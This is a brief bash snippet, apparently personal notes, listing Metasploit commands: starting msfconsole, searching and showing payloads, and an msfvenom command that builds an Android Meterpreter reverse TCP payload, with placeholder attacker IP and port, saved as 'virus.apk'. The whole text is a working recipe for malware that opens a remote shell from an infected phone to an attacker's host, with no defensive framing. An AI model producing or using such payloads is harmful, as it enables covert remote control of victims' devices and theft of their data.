```bash
msfconsole
---
search type:payload
show payloads
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> R > virus.apk
```
